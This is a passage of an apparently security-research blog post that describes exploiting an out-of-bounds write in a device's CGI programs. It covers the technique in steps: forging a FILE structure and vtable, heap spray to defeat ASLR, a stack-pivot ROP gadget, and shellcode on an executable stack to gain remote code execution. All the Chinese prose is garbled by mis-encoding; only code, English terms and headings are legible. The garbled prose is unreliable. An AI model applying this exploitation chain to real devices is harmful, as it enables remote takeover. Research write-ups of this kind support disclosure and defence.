&lt;p&gt;Âõ†Ê≠§Áï∂Ëß∏ÁôºË∂äÁïåÂØ´ÂÖ•ÊôÇÔºåÂØ´ÂÖ•Ë®òÊÜ∂È´îÁöÑÂÄº‰πüÊòØ‰∏ÄÂÄãÂÄãÊåáÂêëÂ≠ó‰∏≤ÁöÑÊåáÊ®ôÔºåËÄåË¢´ÊåáÂêëÁöÑÂ≠ó‰∏≤ÂÖßÂÆπÂâáÊòØÈÄ†ÊàêÊ∫¢Âá∫ÁöÑÂèÉÊï∏„ÄÇ
&lt;img src=&quot;/assets/img/blog/20191223/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ÊºèÊ¥ûÂà©Áî®&quot;&gt;ÊºèÊ¥ûÂà©Áî®&lt;/h2&gt;

&lt;p&gt;Ë¶ÅÂà©Áî®Ë∂äÁïåÂØ´ÂÖ•ÁöÑÊºèÊ¥ûÔºåÂ∞±Ë¶ÅÂÖà‰∫ÜËß£Âà©Áî®ÈÄôÂÄãÊ∫¢Âá∫ÂèØ‰ª•ÂÅöÂà∞‰ªÄÈ∫ºÔºåÁôºÁîüÊ∫¢Âá∫ÁöÑÂÖ®ÂüüËÆäÊï∏ÁµêÊßãÂ¶Ç‰∏ãÔºö&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00000000 CGIEnv          struc ; (sizeof=0x6990, mappedto_95)
00000000 buf             dd ?                    ; offset
00000004 length          dd ?
00000008 field_8         dd 6144 dup(?)          ; offset
00006008 param_arr       param 200 dup(?)
00006968 file_vec        dd ?                    ; offset
0000696C vec_len         dd ?
00006970 vec_cur_len     dd ?
00006974 arg_cnt         dd ?
00006978 field_6978      dd ?
0000697C errcode         dd ?
00006980 method          dd ?
00006984 is_multipart    dd ?
00006988 read_func       dd ?
0000698C field_698C      dd ?
00006990 CGIEnv          ends
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Ê∫¢Âá∫ÁöÑÈô£ÂàóÁÇ∫ÂÖ∂‰∏≠ÁöÑ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;param_arr&lt;/code&gt;ÔºåÂõ†Ê≠§Âú®ÂÖ∂‰πãÂæåÁöÑËÆäÊï∏ÁöÜÂèØËÉΩË¢´Ë¶ÜÂØ´„ÄÇÂåÖÊã¨&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;post_files&lt;/code&gt;„ÄÅ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vec_len&lt;/code&gt;„ÄÅ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vec_cur_len&lt;/code&gt;„ÄÅ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arg_cnt&lt;/code&gt; ‚Ä¶ Á≠âÁ≠â„ÄÇÂÖ∂‰∏≠ÊúÄÂê∏ÂºïÊàëÊ≥®ÊÑèÁöÑÊòØ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file_vec&lt;/code&gt;ÈÄôÂÄãËÆäÊï∏ÔºåÈÄôÊòØ‰∏ÄÂÄãÁî®‰æÜÁÆ°ÁêÜ POST ‰∏äÂÇ≥Ê™îÊ°àÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vector&lt;/code&gt;ÔºåÂ§ßÈÉ®ÂàÜÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vector&lt;/code&gt; ÁµêÊßãÂÉèÊòØÈÄôÊ®£Ôºö
&lt;img src=&quot;/assets/img/blog/20191223/5.png&quot; alt=&quot;&quot; /&gt;
‰ΩøÁî® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;size&lt;/code&gt; Ë®òÈåÑÈô£ÂàóÁöÑÁ∏ΩÈï∑Â∫¶Ôºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;end&lt;/code&gt; Ë®òÈåÑÁõÆÂâçÁî®Âà∞Âì™Ë£°ÔºåÈÄôÊ®£Â∞±ÂèØ‰ª•Âú®ÂÆπÈáè‰∏çÂ§†ÁöÑÊôÇÂÄôÈÄ≤Ë°åÊì¥ÂÖÖ„ÄÇÊàëÂÄëËã•Âà©Áî®ÊºèÊ¥ûÔºå‰ΩøÊ∫¢Âá∫ÁöÑÊåáÊ®ôË¶ÜËìã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vector&lt;/code&gt; ÁöÑÊåáÊ®ôÔºåÂ∞±ÊúâÂèØËÉΩÊúâÊïàÁöÑÂà©Áî®ÔºÅËóâÁî±Ë¶ÜËìãÈÄôÂÄã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vector&lt;/code&gt; ÊåáÊ®ôÔºåÊàëÂÄëÂèØ‰ª•ÈÅîÂà∞ÂÅΩÈÄ†‰∏ÄÂÄã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST file&lt;/code&gt;ÔºåÂèäÂÖ∂‰∏≠ÊâÄÊúâÁõ∏ÈóúËÆäÊï∏ÁöÑÊïàÊûúÔºåËÄåÈÄôÂÄã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST file&lt;/code&gt; ÁµêÊßãË£°Èù¢Â∞±ÂåÖÂê´‰∫ÜÂêÑÁ®ÆÂ∏∏Ë¶ãÁöÑÊ™îÊ°àÁõ∏ÈóúËÆäÊï∏ÔºåÂÉèÊòØË∑ØÂæë„ÄÅÊ™îÂêçÔºåÂíå Linux ‰∏≠Áî®‰æÜÁÆ°ÁêÜÊ™îÊ°àÁöÑ &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FILE&lt;/code&gt; ÁµêÊßã&lt;/strong&gt;ÔºåËÄå &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FILE&lt;/code&gt; ÁµêÊßã‰æøÊòØÈÄôÊ¨°ÁöÑÊîªÊìäÁöÑÈóúÈçµÔºÅ&lt;/p&gt;

&lt;h3 id=&quot;file-structure-exploit&quot;&gt;FILE Structure Exploit&lt;/h3&gt;

&lt;p&gt;ÈÄôÊ¨°ÁöÑÊîªÊìä‰ΩøÁî®‰∫Ü FILE structure exploit ÁöÑÊâãÊ≥ïÔºåÊòØËøëÂπæÂπ¥ËºÉÊñ∞ÁôºÁèæÁöÑÊîªÊìäÊâãÊ≥ïÔºåÁî± angelboy Âú® HITCON CMT ÂÖ¨Èñã&lt;a href=&quot;https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;sup&gt;[1]&lt;/sup&gt;&lt;/a&gt;Ôºö
&lt;img src=&quot;/assets/img/blog/20191223/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;FILE ÁµêÊßãÊòØ Linux ‰∏≠Áî®‰æÜÂÅöÊ™îÊ°àËôïÁêÜÁöÑÁµêÊßãÔºåÂÉèÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STDIN&lt;/code&gt;„ÄÅ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STDOUT&lt;/code&gt;„ÄÅ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STDERR&lt;/code&gt;ÔºåÊàñËÄÖÊòØÂëºÂè´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fopen&lt;/code&gt; ÂæåÂõûÂÇ≥ÁöÑÁµêÊßãÈÉΩÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FILE&lt;/code&gt;„ÄÇËÄåÈÄôÂÄãÁµêÊßã‰πãÊâÄ‰ª•ËÉΩÊàêÁÇ∫ÊºèÊ¥ûÂà©Áî®ÁöÑÁ™ÅÁ†¥Âè£‰∏ªË¶ÅÂéüÂõ†Â∞±ÊòØÂÆÉÊâÄÂåÖÂê´ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vtable&lt;/code&gt; ÊåáÊ®ôÔºö&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_IO_FILE_plus&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;FILE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_IO_jump_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vtable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vtable&lt;/code&gt; Áï∂‰∏≠Ë®òÈåÑ‰∫ÜÂêÑÁ®Æ function pointerÔºåÂ∞çÊáâÂêÑÁ®ÆÊ™îÊ°àËôïÁêÜÁõ∏ÈóúÁöÑÂäüËÉΩÔºö&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_IO_jump_t&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__dummy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__dummy2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_IO_finish_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__finish&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* ... */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_IO_read_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_IO_write_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_IO_seek_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__seek&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_IO_close_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* ... */&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Âõ†Ê≠§Â¶ÇÊûúÊàëÂÄëÂèØ‰ª•ÁØ°Êîπ„ÄÅÂÅΩÈÄ†ÈÄôÂÄã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vtable&lt;/code&gt; ÁöÑË©±ÔºåÂ∞±ÂèØ‰ª•Âú®Á®ãÂºèÂÅöÊ™îÊ°àËôïÁêÜÁöÑÊôÇÂÄôÔºåÂä´ÊåÅÁ®ãÂºèÊµÅÁ®ãÔºÅÊàëÂÄëÂèØ‰ª•‰ª•Ê≠§Ë®ÇÂá∫‰ª•‰∏ãÁöÑÊîªÊìäÊ≠•È©üÔºö&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Âª∫Á´ãÈÄ£Á∑öÔºåÂëºÂè´ CGI&lt;/li&gt;
  &lt;li&gt;‰ΩøÁî®Â§ßÈáèÂèÉÊï∏ÔºåË¶ÜÂØ´ vector ÊåáÊ®ô&lt;/li&gt;
  &lt;li&gt;ÂÅΩÈÄ† POST file Áï∂‰∏≠ÁöÑ FILE*ÔºåÊåáÂêë‰∏ÄÂ°äÂÅΩÈÄ†ÁöÑ FILE ÁµêÊßã&lt;/li&gt;
  &lt;li&gt;Âú® CGI ÊµÅÁ®ã‰∏≠ÂëºÂè´ FILE Áõ∏ÈóúÁöÑÊìç‰Ωú
    &lt;ul&gt;
      &lt;li&gt;fread, fwrite, fclose, ‚Ä¶&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Âä´ÊåÅÁ®ãÂºèÊµÅÁ®ã&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ÊàëÂÄëÁèæÂú®Â∑≤Á∂ìÁü•ÈÅìÁµÇÈªûÊòØ&lt;strong&gt;ÂëºÂè´‰∏ÄÂÄã FILE Êìç‰Ωú&lt;/strong&gt;ÔºåÈÇ£È∫ºÂ∞±ÂèØ‰ª•ÈñãÂßãÂæÄÂõûÊâæ&lt;strong&gt;Âì™ÂÄã function&lt;/strong&gt; ÊòØ CGI Â∏∏Áî®ÁöÑ FILE Êìç‰ΩúÔºåÂèàÊúâ&lt;strong&gt;Âì™‰∏Ä‰∫õ CGI&lt;/strong&gt; ÂèØ‰ª•‰ΩúÁÇ∫ÂÖ•Âè£ÈªûÔºåÊâçËÉΩ‰∏≤Âá∫ÊàëÂÄëÁöÑÊîªÊìäÈèàÔºÅÊàëÂÄëÈ¶ñÂÖàÂ∞ç‰ΩøÁî®Âà∞ POST file ÁöÑÁõ∏ÈóúÂáΩÂºèÂÅöÁ†îÁ©∂Ôºå‰∏¶ÈÅ∏ÂÆö‰∫ÜÁõÆÊ®ô &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MCGI_VarClear()&lt;/code&gt;„ÄÇ
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MCGI_VarClear()&lt;/code&gt; Âú®Ë®±Â§öÁî®Âà∞ FILE ÁöÑ CGI ‰∏≠ÊúâË¢´ÂëºÂè´ÔºåÂÆÉÁî®ÊñºÂú®Á®ãÂºèÁµêÊùüÂâçÂ∞á &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;g_stCGIEnv&lt;/code&gt; Ê∏ÖÁ©∫ÔºåÂåÖÊã¨Â∞áÂãïÊÖãÈÖçÁΩÆÁöÑË®òÊÜ∂È´î &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;free()&lt;/code&gt; ÊéâÔºå‰ª•ÂèäÂ∞áÊâÄÊúâ FILE ÈóúÈñâÔºå‰πüÂ∞±ÊòØÂëºÂè´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fclose()&lt;/code&gt;Ôºå‰πüÊÑèÂë≥ËëóÊòØÂèØ‰ª•ÈÄöÈÅé vtable Ë¢´Âä´ÊåÅÁöÑÔºÅÊàëÂÄëÂèØ‰ª•‰ΩøÁî®ÈÄôÂÄãË∂äÁïåÂØ´ÂÖ•ÊºèÊ¥ûËìãÊéâ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file_vec&lt;/code&gt;ÔºåËÄåÊåáÂêëÁöÑÂÖßÂÆπÂ∞±ÊòØ HTTP request ÁöÑÂèÉÊï∏Ôºå‰æøÂèØ‰ª•ÂÅΩÈÄ†ÁÇ∫ POST filesÔºÅÂÉèÊòØ‰∏ãÈù¢ÈÄôÂÄãÁµêÊßãÔºö
&lt;img src=&quot;/assets/img/blog/20191223/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÁöÑÊúÄÁµÇÁõÆÊ®ôÂ∞±ÊòØÂ∞á FILE* ÊåáÂêëÂÅΩÈÄ†ÁöÑÁµêÊßãÔºåËóâÁî±ÂÅΩÈÄ†ÁöÑ vtable Âä´ÊåÅÁ®ãÂºèÊµÅÁ®ãÔºÅÈÄôÊôÇÂÄô‰æøÂá∫Áèæ‰∫Ü‰∏ÄÂÄãÂïèÈ°åÔºåÊàëÂÄëÈúÄË¶ÅÂ∞á FILE* ÈÄôÂÄãÊåáÊ®ôÊåáÂêë‰∏ÄÂÄãÂÖßÂÆπÂèØÊéßÁöÑ‰ΩçÁΩÆÔºå‰ΩÜÊòØÂÖ∂ÂØ¶ÊàëÂÄë‰∏¶‰∏çÁü•ÈÅìË©≤ÊåáÂà∞Âì™Ë£°ÂéªÔºåÊúÉÊúâÈÄôÂÄãÂïèÈ°åÊòØËµ∑Âõ†Êñº Linux ‰∏äÁöÑ‰∏ÄÂÄãÈò≤Á¶¶Ê©üÂà∂ - ASLR„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;address-space-layout-randomization-aslr&quot;&gt;Address Space Layout Randomization (ASLR)&lt;/h3&gt;

&lt;p&gt;ASLR ‰ΩøÂæóÊØèÊ¨°Á®ãÂºèÂú®Âü∑Ë°å‰∏¶ËºâÂÖ•Ë®òÊÜ∂È´îÊôÇÔºåÊúÉÈö®Ê©üËºâÂÖ•Ëá≥‰∏çÂêåÁöÑË®òÊÜ∂È´î‰ΩçÁΩÆÔºåÊàëÂÄëÂèØ‰ª•ÂòóË©¶‰ΩøÁî® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat /proc/self/maps&lt;/code&gt; ËßÄÂØüÊØè‰∏ÄÊ¨°Âü∑Ë°åÊôÇÁöÑË®òÊÜ∂È´î‰ΩçÁΩÆÊòØÂê¶Áõ∏ÂêåÔºö
&lt;img src=&quot;/assets/img/blog/20191223/8.png&quot; alt=&quot;&quot; /&gt;
ASLR Âú®Â§ßÈÉ®ÂàÜÁöÑÁí∞Â¢É‰∏≠ÈÉΩÊòØÈ†êË®≠ÈñãÂïüÁöÑÔºåÂõ†Ê≠§Âú®Êí∞ÂØ´ exploit ÊôÇÔºåÂ∏∏ÈÅáÂà∞ÂèØ‰ª•ÂÅΩÈÄ†ÊåáÊ®ôÔºåÂçª‰∏çÁü•ÈÅìË©≤ÊåáÂà∞Âì™Ë£°ÁöÑÁ™òÂ¢É„ÄÇ
ËÄåÈÄôÂÄãÊ©üÂà∂Âú® CGI ÁöÑÊû∂Êßã‰∏ãÊúÉÈÄ†ÊàêÊõ¥Â§ßÁöÑÈòªÁ§ôÔºå‰∏ÄËà¨ÁöÑ‰º∫ÊúçÂô®ÁöÑÊîªÊìäÊµÅÁ®ãÂèØËÉΩÊòØÈÄôÊ®£Ôºö
&lt;img src=&quot;/assets/img/blog/20191223/9.png&quot; alt=&quot;&quot; /&gt;
ÂèØ‰ª•Âú®‰∏ÄÂÄãÈÄ£Á∑öÁï∂‰∏≠ leak address ‰∏¶Áî®‰æÜÂÅöÈÄ≤‰∏ÄÊ≠•ÁöÑÊîªÊìäÔºå‰ΩÜÂú® CGI Êû∂Êßã‰∏≠ÂçªÊòØÈÄôÊ®£Ôºö
&lt;img src=&quot;/assets/img/blog/20191223/10.png&quot; alt=&quot;&quot; /&gt;
Âú®ÈÄôÂÄãÊÉÖÊ≥Å‰∏ãÔºåleak ÂæóÂà∞ÁöÑ address ÊòØÁÑ°Ê≥ïÂú®ÂæåÁ∫åÊîªÊìä‰∏≠‰ΩøÁî®ÁöÑÔºÅÂõ†ÁÇ∫ CGI Âü∑Ë°åÂÆåÂ∞±ÁµêÊùü‰∫ÜÔºå‰∏ã‰∏ÄÂÄã request ÂèàÊòØÂÖ®Êñ∞ÁöÑ CGIÔºÅ
ÁÇ∫‰∫ÜÊáâÂ∞çÈÄôÂÄãÂïèÈ°åÔºåÊàëÂÄëÊúÄÂæåÂØ´‰∫ÜÂÖ©ÂÄã exploitÔºåÊîªÊìäÁöÑÊâãÊ≥ïÊ†πÊìö CGI binary ËÄåÊúâ‰∏çÂêå„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;post-auth-rce---cgi-binmsg_read&quot;&gt;Post-Auth RCE - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi-bin/msg_read&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;Á¨¨‰∏ÄÂÄã exploit ÁöÑÂÖ•Âè£ÈªûÊòØ‰∏ÄÂÄãÈúÄË¶ÅÁôªÂÖ•ÁöÑÈ†ÅÈù¢ÔºåÈÄô‰∏ÄÈöªÁ®ãÂºèËºÉÂ§ß„ÄÅÂäüËÉΩ‰πüËºÉÂ§ö„ÄÇÂú®ÈÄô‰∏ÄÂÄã exploit ‰∏≠ÔºåÊàëÂÄë‰ΩøÁî®‰∫Ü heap spray ÁöÑÊâãÊ≥ï‰æÜÂÖãÊúç ASLRÔºå‰πüÂ∞±ÊòØÂú® heap ‰∏≠Â°´ÂÖ•Â§ßÈáèÈáçË§áÁöÑÁâ©‰ª∂ÔºåÂ¶ÇÊ≠§‰∏Ä‰æÜÊàëÂÄëÂ∞±ÊúâÂæàÈ´òÁöÑÊ©üÁéáÂèØ‰ª•&lt;strong&gt;Áåú&lt;/strong&gt;Âà∞ÂÆÉÁöÑ‰ΩçÁΩÆ„ÄÇ
&lt;img src=&quot;/assets/img/blog/20191223/11.png&quot; alt=&quot;&quot; /&gt;
ËÄå spray ÁöÑÂÖßÂÆπÂ∞±ÊòØÂ§ßÈáèÂÅΩÈÄ†Â•ΩÁöÑ FILE ÁµêÊßãÔºåÂåÖÂê´ÂÅΩÈÄ†ÁöÑ vtable„ÄÇÂæûÈÄôÈöª binary ‰∏≠ÔºåÊàëÂÄëÊâæÂà∞‰∫Ü‰∏ÄÂÄãÂçÅÂàÜÂØ¶Áî®ÁöÑ &lt;strong&gt;gadget&lt;/strong&gt;Ôºå‰πüÂ∞±ÊòØÂ∞èÁ®ãÂºèÁâáÊÆµÔºö&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;xchg eax, esp; ret
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;ÈÄôÂÄã gadget ÁöÑ‰ΩúÁî®Âú®ÊñºÔºåÊàëÂÄëÂèØ‰ª•&lt;strong&gt;ÊîπËÆä stack ÁöÑ‰ΩçÁΩÆ&lt;/strong&gt;ÔºåËÄåÂâõÂ•ΩÊ≠§ÊôÇÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eax&lt;/code&gt; ÊåáÂêëÂÖßÂÆπÊòØÂèØÊéßÁöÑÔºåÂõ†Ê≠§Êï¥ÂÄã stack ÁöÑÂÖßÂÆπÈÉΩÂèØ‰ª•ÂÅΩÈÄ†Ôºå‰πüÂ∞±ÊòØË™™ÊàëÂÄëÂèØ‰ª•‰ΩøÁî® ROP(Return-oriented programming) ‰æÜÂÅöÂà©Áî®ÔºÅÊñºÊòØÊàëÂÄëÂú®ÂÅΩÈÄ†ÁöÑ vtable ‰∏≠Ë®≠ÁΩÆ‰∫Ü stack Êê¨ÁßªÁöÑ gadget ‰ª•ÂèäÂæåÁ∫åÂà©Áî®ÁöÑ ROP ÊîªÊìäÈèàÔºåÈÄ≤Ë°å ROP ÊîªÊìäÔºÅ
&lt;img src=&quot;/assets/img/blog/20191223/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÂèØ‰ª•ÂÅö ROPÔºå‰πüÂ∞±ÂèØ‰ª•Êãø shell ‰∫ÜÂ∞çÂêßÔºÅ‰Ω†‰ª•ÁÇ∫ÊòØÈÄôÊ®£ÂóéÔºü‰∏çÔºåÂÖ∂ÂØ¶ÈÇÑÊúâ‰∏ÄÂÄãÂ§ßÂïèÈ°åÔºåÂêåÊ®£Â∞éÂõ†ÊñºÂâçÈù¢ÊèêÂà∞ÁöÑÈò≤Á¶¶Ê©üÂà∂ ASLR ‚Äì ÊàëÂÄëÊ≤íÊúâ system ÁöÑ‰ΩçÁΩÆÔºÅÈÄôÈöª binary Êú¨Ë∫´Êèê‰æõÁöÑ gadget ‰∏¶‰∏çË∂≥‰ª•ÈñãÂïü‰∏ÄÂÄã shellÔºåÂõ†Ê≠§ÊàëÂÄëÂ∏åÊúõÂèØ‰ª•Áõ¥Êé•Âà©Áî® libc Áï∂‰∏≠ÁöÑ system ‰æÜÈÅîÊàêÁõÆÁöÑÔºå‰ΩÜÊ≠£Â¶ÇÂâçÈù¢ÊâÄÊèêÂà∞ÁöÑÔºåË®òÊÜ∂È´î‰ΩçÁΩÆÊØèÊ¨°ËºâÂÖ•ÈÉΩÊòØÈö®Ê©üÂåñÁöÑÔºåÊàëÂÄë‰∏¶‰∏çÁü•ÈÅì system ÁöÑÁ¢∫Âàá‰ΩçÁΩÆÔºÅ
Á∂ìÈÅéÊàëÂÄë‰ªîÁ¥∞ÁöÑËßÄÂØüÈÄôÊîØÁ®ãÂºè‰ª•ÂæåÔºåÊàëÂÄëÁôºÁèæ‰∫Ü‰∏Ä‰ª∂ÈùûÂ∏∏ÁâπÂà•ÁöÑ‰∫ãÔºåÈÄôÈöªÁ®ãÂºèÁêÜË´ñ‰∏äÊòØÊúâÊâìÈñã NXÔºå‰πüÂ∞±ÊòØÂèØÂØ´ÊÆµ‰∏çÂèØÂü∑Ë°åÁöÑ‰øùË≠∑Ê©üÂà∂
&lt;img src=&quot;/assets/img/blog/20191223/13.png&quot; alt=&quot;&quot; /&gt;
‰ΩÜÊòØÂØ¶ÈöõÂü∑Ë°åÁöÑÊôÇÂÄôÔºåstack ÁöÑÂü∑Ë°åÊ¨äÈôêÂçªÊúÉË¢´ÊâìÈñãÔºÅ
&lt;img src=&quot;/assets/img/blog/20191223/14.png&quot; alt=&quot;&quot; /&gt;
‰∏çË´ñÂéüÂõ†ÁÇ∫‰ΩïÔºåÈÄôÂÄãË®≠ÁΩÆÂ∞çÈß≠ÂÆ¢‰æÜË™™ÊòØÈùûÂ∏∏Êñπ‰æøÁöÑÔºåÊàëÂÄëÂèØ‰ª•Âà©Áî®ÈÄôÂÄãÂèØÂü∑Ë°åÊÆµÔºåÂ∞á shellcode Êîæ‰∏äÂéªÂü∑Ë°åÔºåÂ∞±ÂèØ‰ª•ÊàêÂäüÂæóÂà∞ shellÔºåÈÅîÊàê RCEÔºÅ&lt;/p&gt;

&lt;p&gt;ÁÑ∂ËÄåÔºåÈÄôÂÄãÊîªÊìäÊòØÈúÄË¶ÅÁôªÂÖ•ÁöÑÔºåÂ∞çÊñºËøΩÊ±ÇÂÆåÁæéÁöÑ DEVCORE Á†îÁ©∂ÁµÑ‰æÜË™™Ôºå‰∏¶‰∏çË∂≥Â§†ÔºÅÂõ†Ê≠§ÊàëÂÄëÊõ¥ÈÄ≤‰∏ÄÊ≠•ÁöÑÁ†îÁ©∂‰∫ÜÂÖ∂ÂÆÉÊîªÊìäË∑ØÂæëÔºÅ&lt;/p&gt;

&lt;h3 id=&quot;pre-auth-rce---cgi-bincgi_api&quot;&gt;Pre-Auth RCE - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi-bin/cgi_api&lt;/code&gt;&lt;/h3&gt;
